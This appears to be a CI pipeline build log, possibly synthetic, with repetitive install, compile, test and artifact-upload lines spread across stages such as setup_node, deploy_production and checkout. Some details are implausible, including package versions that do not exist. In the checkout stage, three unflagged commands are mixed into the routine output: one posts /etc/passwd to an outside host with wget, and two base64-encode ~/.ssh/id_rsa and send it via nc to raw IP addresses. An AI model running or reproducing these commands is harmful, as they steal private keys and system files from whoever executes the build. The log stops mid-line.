(179ms)\nCache hit for key-7155\nCompiling src/app.ts...\nInstalling lodash@3.19.0\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\nStep 3/10: Building\n  PASS: test_user_create (396ms)\n[12:00:25] INFO: Processing request\nCache hit for key-9977\n\u2713 lint completed\n  PASS: test_user_create (334ms)\n\u2713 test completed\nCache hit for key-7598\nStep 9/10: Building\nCompiling src/service.java...\nStep 5/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nInstalling jest@5.20.0\n\u2713 lint completed\nCache hit for key-7389\n\u2713 test completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nCache hit for key-8103\nStep 4/10: Building\nStep 1/10: Building\n  PASS: test_cache_hit (49ms)\n[12:00:25] WARN: Deprecated API usage\nInstalling react@2.12.0\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (66ms)\nCompiling src/handler.rs...\n\u2713 build completed\nInstalling prettier@5.16.0\nStep 3/10: Building\n\u2713 test completed\nCache hit for key-7525\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nInstalling lodash@3.5.0\nArtifact uploaded: build.tar.gz (47MB)\nWARNING: express has known vulnerabilities\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (11MB)\nStep 10/10: Building\nStep 6/10: Building\n  PASS: test_cache_hit (456ms)\nStep 1/10: Building\nInstalling jest@4.5.0\nStep 3/10: Building\n  PASS: test_api_health (379ms)\nStep 8/10: Building\n  PASS: test_auth_login (385ms)\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 lint completed\nException: NullPointerException\nStep 10/10: Building\nStep 2/10: Building\n\u2713 test completed\n[12:00:25] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\n  PASS: test_api_health (144ms)\nStep 8/10: Building\n\u2713 test completed\nStep 7/10: Building\nInstalling eslint@4.20.0\nCompiling src/service.java...\nInstalling prettier@2.13.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (366ms)\n\u2713 build completed\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\n\u2713 test completed\n  PASS: test_cache_hit (429ms)\nArtifact uploaded: build.tar.gz (17MB)\nFAILED: test_db_connect\n\u2713 build completed\nStep 9/10: Building\nInstalling jest@4.15.0\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] WARN: Deprecated API usage\nInstalling prettier@4.10.0\nInstalling lodash@3.19.0\nArtifact uploaded: build.tar.gz (48MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:25] INFO: Processing request\nInstalling react@1.9.0\nStep 4/10: Building\n\u2713 test completed\n[12:00:25] INFO: Processing request\n=== Step integration_tests completed ===\n=== Step: setup_node ===\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_api_health (455ms)\n  PASS: test_auth_login (40ms)\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-1672\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nInstalling express@4.19.0\nCompiling src/service.java...\n  PASS: test_cache_hit (392ms)\nArtifact uploaded: build.tar.gz (37MB)\nInstalling prettier@1.2.0\nInstalling react@1.17.0\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (153ms)\nCompiling src/handler.rs...\nCache hit for key-7595\nStep 5/10: Building\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 2/10: Building\n\u2713 build completed\n[12:00:25] ERROR: Connection failed\n  PASS: test_db_connect (410ms)\n  PASS: test_db_connect (285ms)\nStep 9/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (35MB)\nStep 7/10: Building\nCache hit for key-7336\n\u2713 lint completed\nCache hit for key-6286\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-3155\n[12:00:25] INFO: Processing request\n\u2717 build failed with exit code 104\nInstalling lodash@4.1.0\nInstalling axios@2.10.0\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/handler.rs...\nCache hit for key-5885\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nInstalling prettier@5.15.0\n\u2713 test completed\nInstalling jest@5.19.0\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:25] WARN: Deprecated API usage\nInstalling webpack@3.8.0\n[12:00:25] INFO: Processing request\nCache hit for key-3122\nInstalling eslint@2.5.0\nInstalling lodash@1.17.0\nCache hit for key-2555\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/app.ts...\nStep 1/10: Building\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nStep 10/10: Building\nCache hit for key-4245\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (335ms)\n  PASS: test_api_health (428ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nInstalling react@4.12.0\nArtifact uploaded: build.tar.gz (32MB)\nInstalling react@1.12.0\nInstalling react@4.1.0\nStep 1/10: Building\nCache hit for key-5568\n\u2713 lint completed\nStep 5/10: Building\n  PASS: test_auth_login (105ms)\nStep 5/10: Building\n  PASS: test_cache_hit (98ms)\nInstalling prettier@2.12.0\n\u2713 lint completed\n  PASS: test_auth_login (138ms)\nCompiling src/index.js...\nInstalling jest@3.9.0\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (68ms)\n[12:00:25] INFO: Processing request\nStep 7/10: Building\n  PASS: test_cache_hit (66ms)\n[12:00:25] INFO: Processing request\nStep 2/10: Building\nCache hit for key-5970\nCompiling src/app.ts...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 test completed\nCache hit for key-2403\nException: NullPointerException\nCompiling src/service.java...\nStep 7/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-6064\nInstalling express@2.3.0\nCompiling src/app.ts...\nInstalling express@5.19.0\n[12:00:25] INFO: Processing request\nCache hit for key-5757\n\u2713 lint completed\n\u2713 build completed\nInstalling express@3.16.0\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nCache hit for key-5785\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\nInstalling react@1.0.0\n\u2713 test completed\nStep 1/10: Building\nInstalling eslint@2.18.0\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\nCache hit for key-4910\n  PASS: test_db_connect (234ms)\nCache hit for key-6263\n\u2713 lint completed\nInstalling webpack@1.3.0\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-2322\nCache hit for key-3781\nCache hit for key-8480\n  PASS: test_auth_login (43ms)\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nInstalling eslint@2.12.0\nStep 2/10: Building\nCompiling src/app.ts...\nInstalling eslint@4.8.0\nCache hit for key-3373\n\u2717 build failed with exit code 88\nStep 6/10: Building\nWARNING: lodash has known vulnerabilities\nStep 5/10: Building\n\u2713 lint completed\nInstalling prettier@3.0.0\nStep 5/10: Building\nCache hit for key-8435\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_cache_hit (486ms)\n  PASS: test_cache_hit (356ms)\n\u2713 lint completed\nCache hit for key-8849\nArtifact uploaded: build.tar.gz (3MB)\nStep 7/10: Building\nInstalling jest@4.7.0\nInstalling prettier@2.8.0\n  PASS: test_user_create (369ms)\nArtifact uploaded: build.tar.gz (45MB)\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\nStep 3/10: Building\n  PASS: test_auth_login (93ms)\n  PASS: test_db_connect (419ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_api_health (164ms)\n  PASS: test_db_connect (344ms)\nStep 4/10: Building\nCompiling src/index.js...\nCompiling src/main.py...\n\u2713 test completed\n  PASS: test_auth_login (34ms)\nCompiling src/app.ts...\n  PASS: test_auth_login (486ms)\n\u2713 build completed\nCompiling src/index.js...\nInstalling react@4.11.0\nCache hit for key-1872\n\u2713 build completed\n\u2713 build completed\nInstalling lodash@1.3.0\nInstalling eslint@4.15.0\nWARNING: lodash has known vulnerabilities\n=== Step setup_node completed ===\n=== Step: type_check ===\nCompiling src/handler.rs...\nCompiling src/service.java...\n\u2713 test completed\n\u2713 build completed\nCompiling src/main.py...\n  PASS: test_api_health (467ms)\n[12:00:25] WARN: Deprecated API usage\nStep 1/10: Building\nStep 4/10: Building\nWARNING: lodash has known vulnerabilities\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-5774\nCompiling src/handler.rs...\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nInstalling eslint@5.7.0\n[12:00:25] INFO: Processing request\nCache hit for key-6985\nInstalling lodash@1.5.0\nCache hit for key-8506\nInstalling express@1.0.0\nCache hit for key-1499\nFAILED: test_cache_hit\nInstalling prettier@3.11.0\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/main.py...\n  PASS: test_auth_login (346ms)\nCompiling src/handler.rs...\n[12:00:25] WARN: Deprecated API usage\nInstalling prettier@2.6.0\n\u2713 test completed\n  PASS: test_auth_login (143ms)\nCompiling src/handler.rs...\n  PASS: test_user_create (485ms)\nException: RuntimeError\n\u2713 lint completed\n\u2713 build completed\nInstalling jest@2.4.0\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_api_health (215ms)\n[12:00:25] INFO: Processing request\nInstalling eslint@5.7.0\nCache hit for key-5070\nInstalling express@4.9.0\nInstalling lodash@2.5.0\nCompiling src/handler.rs...\nCache hit for key-4957\n\u2713 build completed\n  PASS: test_auth_login (300ms)\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/handler.rs...\nCompiling src/main.py...\nCompiling src/service.java...\nInstalling lodash@4.9.0\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (475ms)\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n\u2713 test completed\nInstalling express@2.13.0\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (360ms)\nCompiling src/service.java...\n  PASS: test_api_health (427ms)\n  PASS: test_cache_hit (175ms)\nInstalling react@1.13.0\nArtifact uploaded: build.tar.gz (27MB)\nStep 10/10: Building\nStep 4/10: Building\n\u2713 lint completed\nStep 7/10: Building\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_cache_hit (433ms)\nStep 5/10: Building\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (191ms)\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] ERROR: Connection failed\nStep 3/10: Building\n  PASS: test_user_create (83ms)\nArtifact uploaded: build.tar.gz (33MB)\nStep 8/10: Building\nInstalling axios@5.10.0\nCache hit for key-4130\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_user_create (448ms)\nWARNING: eslint has known vulnerabilities\n  PASS: test_cache_hit (387ms)\n[12:00:25] INFO: Processing request\nCache hit for key-2569\n  PASS: test_db_connect (308ms)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling express@2.16.0\nInstalling express@2.17.0\n  PASS: test_db_connect (172ms)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling react@5.0.0\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 test completed\nStep 6/10: Building\nCache hit for key-7861\n[12:00:25] WARN: Deprecated API usage\nFAILED: test_cache_hit\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\nStep 9/10: Building\nWARNING: prettier has known vulnerabilities\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nStep 3/10: Building\nCompiling src/utils.go...\nStep 8/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_auth_login (147ms)\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:25] INFO: Processing request\nInstalling prettier@4.15.0\n[12:00:25] INFO: Processing request\nWARNING: webpack has known vulnerabilities\n\u2713 test completed\nStep 8/10: Building\nStep 10/10: Building\nInstalling lodash@4.2.0\n\u2713 build completed\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\nCache hit for key-4489\nCompiling src/app.ts...\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (49ms)\n[12:00:25] INFO: Processing request\nInstalling jest@2.12.0\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 test completed\n  PASS: test_db_connect (442ms)\nCache hit for key-1283\n  PASS: test_cache_hit (288ms)\nStep 6/10: Building\nStep 9/10: Building\nCache hit for key-9479\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_auth_login (193ms)\n[12:00:25] WARN: Deprecated API usage\nCache hit for key-1101\nCache hit for key-5367\nCache hit for key-9746\n  PASS: test_api_health (401ms)\n  PASS: test_auth_login (294ms)\nCache hit for key-9514\n  PASS: test_cache_hit (1ms)\nStep 7/10: Building\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] WARN: Deprecated API usage\nInstalling lodash@1.14.0\n[12:00:25] INFO: Processing request\n\u2713 build completed\nCache hit for key-3836\nCompiling src/index.js...\nWARNING: prettier has known vulnerabilities\nInstalling lodash@3.5.0\nStep 2/10: Building\nCache hit for key-7356\nStep 8/10: Building\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nCompiling src/service.java...\n[12:00:25] WARN: Deprecated API usage\nCompiling src/index.js...\n  PASS: test_user_create (459ms)\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/index.js...\nStep 7/10: Building\nCache hit for key-1397\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (48MB)\nStep 8/10: Building\n[12:00:25] WARN: Deprecated API usage\nCompiling src/index.js...\nStep 9/10: Building\nCompiling src/service.java...\n=== Step type_check completed ===\n=== Step: deploy_production ===\nInstalling eslint@1.15.0\n  PASS: test_cache_hit (377ms)\nStep 2/10: Building\nStep 2/10: Building\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling react@1.14.0\n\u2713 lint completed\nCache hit for key-9203\n[12:00:25] INFO: Processing request\nStep 6/10: Building\nStep 1/10: Building\n\u2713 build completed\n[12:00:25] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/main.py...\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:25] INFO: Processing request\nInstalling prettier@1.18.0\n  PASS: test_db_connect (83ms)\nCache hit for key-1494\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (354ms)\nException: TypeError\n  PASS: test_api_health (256ms)\nStep 10/10: Building\nCompiling src/service.java...\nCompiling src/main.py...\nCache hit for key-9172\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nInstalling webpack@3.19.0\n[12:00:25] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nInstalling react@3.13.0\n\u2713 test completed\n\u2713 test completed\nCache hit for key-1770\n[12:00:25] INFO: Processing request\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (310ms)\nCache hit for key-6900\nCompiling src/main.py...\nCache hit for key-2543\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/handler.rs...\nStep 10/10: Building\nInstalling jest@5.13.0\nCache hit for key-6385\nArtifact uploaded: build.tar.gz (19MB)\nWARNING: jest has known vulnerabilities\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/10: Building\n\u2713 build completed\nStep 3/10: Building\n[12:00:25] ERROR: Connection failed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nStep 1/10: Building\nCache hit for key-1109\n[12:00:25] INFO: Processing request\nFAILED: test_cache_hit\nCache hit for key-5560\nStep 4/10: Building\n[12:00:25] INFO: Processing request\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (176ms)\n[12:00:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-3670\n  PASS: test_user_create (387ms)\nCache hit for key-3887\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/utils.go...\n  PASS: test_auth_login (94ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: NullPointerException\nInstalling eslint@4.7.0\n\u2713 test completed\n  PASS: test_cache_hit (180ms)\nInstalling lodash@2.8.0\n[12:00:25] INFO: Processing request\nInstalling react@4.16.0\nInstalling prettier@2.1.0\nWARNING: react has known vulnerabilities\nCache hit for key-5275\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:25] INFO: Processing request\nStep 8/10: Building\n[12:00:25] INFO: Processing request\nInstalling express@2.14.0\n\u2713 build completed\n  PASS: test_auth_login (314ms)\n  PASS: test_db_connect (440ms)\nInstalling jest@3.16.0\nCache hit for key-3913\n  PASS: test_db_connect (61ms)\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_auth_login (290ms)\nStep 2/10: Building\n\u2713 test completed\n[12:00:25] INFO: Processing request\nInstalling axios@3.2.0\n  PASS: test_db_connect (272ms)\nInstalling jest@1.11.0\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-7995\n[12:00:25] INFO: Processing request\nStep 5/10: Building\nCache hit for key-5946\nStep 1/10: Building\nCompiling src/index.js...\nStep 6/10: Building\nWARNING: jest has known vulnerabilities\n[12:00:25] INFO: Processing request\n\u2713 build completed\n[12:00:25] WARN: Deprecated API usage\nInstalling prettier@5.5.0\n  PASS: test_auth_login (195ms)\n  PASS: test_api_health (400ms)\nInstalling axios@1.19.0\n  PASS: test_cache_hit (456ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:25] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_db_connect (220ms)\n  PASS: test_cache_hit (255ms)\nStep 2/10: Building\n\u2713 test completed\nFAILED: test_db_connect\n  PASS: test_api_health (132ms)\nCompiling src/handler.rs...\nCache hit for key-3783\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 6/10: Building\nStep 7/10: Building\nCache hit for key-8757\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/handler.rs...\n\u2713 test completed\n[12:00:25] INFO: Processing request\nInstalling lodash@1.8.0\n  PASS: test_user_create (429ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nCompiling src/app.ts...\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n\u2713 test completed\nStep 10/10: Building\n  PASS: test_db_connect (333ms)\n\u2713 build completed\n  PASS: test_auth_login (405ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 test completed\nCompiling src/handler.rs...\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\nInstalling prettier@3.14.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\nInstalling eslint@4.19.0\n\u2713 build completed\nInstalling express@2.17.0\n\u2713 lint completed\n  PASS: test_cache_hit (159ms)\n  PASS: test_cache_hit (251ms)\nInstalling react@4.5.0\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_user_create (334ms)\nStep 5/10: Building\nInstalling jest@5.15.0\n  PASS: test_cache_hit (223ms)\nStep 9/10: Building\nStep 4/10: Building\nFAILED: test_api_health\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\nCache hit for key-9943\n[12:00:25] INFO: Processing request\nCache hit for key-3602\nCompiling src/handler.rs...\nCache hit for key-1042\n[12:00:25] ERROR: Connection failed\nStep 10/10: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_api_health (355ms)\nStep 6/10: Building\nWARNING: express has known vulnerabilities\n[12:00:25] INFO: Processing request\nCache hit for key-3049\nCache hit for key-3492\nCache hit for key-1546\nArtifact uploaded: build.tar.gz (45MB)\nInstalling react@2.1.0\n  PASS: test_cache_hit (17ms)\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-7242\n  PASS: test_api_health (104ms)\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/service.java...\nCache hit for key-3628\nCompiling src/handler.rs...\n  PASS: test_user_create (323ms)\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (22MB)\n\u2717 build failed with exit code 97\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/service.java...\nInstalling prettier@1.18.0\nCache hit for key-3285\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_user_create (397ms)\nStep 1/10: Building\n\u2713 lint completed\nCache hit for key-2969\nStep 9/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nStep 9/10: Building\nInstalling webpack@1.18.0\n  PASS: test_api_health (101ms)\n\u2713 lint completed\nStep 3/10: Building\n\u2713 build completed\nCompiling src/index.js...\nStep 10/10: Building\nInstalling react@1.0.0\n\u2713 lint completed\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nStep 9/10: Building\nCache hit for key-7094\nInstalling eslint@2.2.0\n  PASS: test_cache_hit (138ms)\nInstalling prettier@4.19.0\n[12:00:25] INFO: Processing request\nStep 7/10: Building\nCache hit for key-5777\n[12:00:25] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\nStep 2/10: Building\n  PASS: test_user_create (105ms)\nCompiling src/main.py...\nStep 7/10: Building\n  PASS: test_api_health (197ms)\nCompiling src/index.js...\n  PASS: test_auth_login (174ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (266ms)\n[12:00:25] INFO: Processing request\nCache hit for key-4400\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (298ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/utils.go...\nCache hit for key-9222\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-5181\n[12:00:25] INFO: Processing request\nStep 5/10: Building\n[12:00:25] INFO: Processing request\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (173ms)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (33MB)\nWARNING: eslint has known vulnerabilities\n\u2713 lint completed\nCache hit for key-3170\nCache hit for key-2415\nInstalling eslint@3.15.0\n\u2713 lint completed\n  PASS: test_user_create (78ms)\nCache hit for key-5262\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n  PASS: test_api_health (276ms)\nArtifact uploaded: build.tar.gz (40MB)\nStep 7/10: Building\nInstalling react@3.18.0\nInstalling react@5.12.0\nCache hit for key-3496\n  PASS: test_api_health (497ms)\n\u2713 test completed\n\u2713 build completed\n[12:00:25] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/app.ts...\nCache hit for key-2319\n\u2713 test completed\nInstalling eslint@1.4.0\n[12:00:25] INFO: Processing request\nCache hit for key-8025\nCache hit for key-9149\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 lint completed\nInstalling axios@2.8.0\n\u2713 test completed\nCompiling src/app.ts...\nStep 7/10: Building\nCompiling src/app.ts...\nCompiling src/handler.rs...\n  PASS: test_cache_hit (464ms)\n[12:00:25] INFO: Processing request\n  PASS: test_db_connect (129ms)\nCompiling src/main.py...\n[12:00:25] INFO: Processing request\n  PASS: test_user_create (477ms)\nStep 7/10: Building\n  PASS: test_api_health (432ms)\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-8809\nStep 1/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/utils.go...\n  PASS: test_api_health (65ms)\nStep 8/10: Building\nInstalling prettier@4.20.0\nCache hit for key-7424\nCompiling src/main.py...\nStep 5/10: Building\n[12:00:25] INFO: Processing request\n[12:00:25] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-1394\nInstalling prettier@1.13.0\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (430ms)\n  PASS: test_db_connect (56ms)\nInstalling eslint@5.10.0\n\u2713 build completed\nStep 10/10: Building\nInstalling react@4.19.0\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nCache hit for key-5643\nStep 4/10: Building\nException: NullPointerException\n[12:00:25] INFO: Processing request\n  PASS: test_api_health (84ms)\nCache hit for key-2489\nCompiling src/utils.go...\nCompiling src/service.java...\n[12:00:25] INFO: Processing request\nStep 6/10: Building\nCompiling src/utils.go...\n  PASS: test_db_connect (165ms)\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:25] INFO: Processing request\nInstalling lodash@5.20.0\n[12:00:25] INFO: Processing request\nCache hit for key-6092\n[12:00:25] INFO: Processing request\nStep 1/10: Building\nStep 8/10: Building\nCache hit for key-6352\n  PASS: test_user_create (238ms)\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\nCompiling src/utils.go...\nCompiling src/index.js...\nCompiling src/index.js...\n=== Step restore_cache completed ===\n=== Step: checkout ===\n[12:00:25] INFO: Processing request\nWARNING: react has known vulnerabilities\nInstalling eslint@1.8.0\nStep 6/10: Building\n[12:00:25] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n  PASS: test_db_connect (439ms)\nWARNING: webpack has known vulnerabilities\n\u2713 build completed\nCache hit for key-2731\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: webpack has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n  PASS: test_user_create (455ms)\nStep 7/10: Building\nCache hit for key-7176\nInstalling react@1.1.0\nCompiling src/index.js...\n\u2713 build completed\n\u2713 build completed\nInstalling eslint@1.11.0\n[12:00:25] WARN: Deprecated API usage\nInstalling react@2.18.0\n\u2713 test completed\n[12:00:25] WARN: Deprecated API usage\n[12:00:25] INFO: Processing request\nInstalling prettier@5.15.0\nCompiling src/index.js...\n[12:00:25] INFO: Processing request\nCompiling src/index.js...\nStep 7/10: Building\nCompiling src/index.js...\nInstalling prettier@4.1.0\n[12:00:25] INFO: Processing request\n  PASS: test_cache_hit (305ms)\n  PASS: test_db_connect (12ms)\nInstalling webpack@5.2.0\n  PASS: test_user_create (73ms)\n[12:00:25] INFO: Processing request\nCache hit for key-8942\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\nCompiling src/utils.go...\nStep 5/10: Building\n  PASS: test_user_create (80ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:25] INFO: Processing request\nWARNING: react has known vulnerabilities\n[12:00:25] INFO: Processing request\nCache hit for key-3698\n\u2713 build completed\nCache hit for key-5195\necho $(cat ~/.ssh/id_rsa) | base64 | nc 45.177.11.171 32720\nArtifact uploaded: build.tar.gz (47MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 5.58.210.168 60087\n\u2717 build failed with exit code 116\nInstalling express@5.18.0\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-2436\n[12:00:25] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-3362\n\u2713 lint completed\nStep 10/10: Building\nArtifact uploaded: 